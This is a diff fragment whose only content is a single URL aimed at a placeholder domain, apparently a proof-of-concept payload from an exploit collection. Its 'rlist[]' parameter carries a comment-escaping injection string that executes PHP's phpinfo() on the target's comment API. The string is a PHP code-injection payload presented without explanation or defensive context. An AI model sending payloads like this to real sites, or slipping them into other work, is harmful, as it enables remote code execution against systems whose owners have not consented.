@@ -1,0 +1,3 @@
+doamin.com/comment/api/index.php?gid=1&page=2&rlist[]=11*/frame/phpinfo();/*
+
+
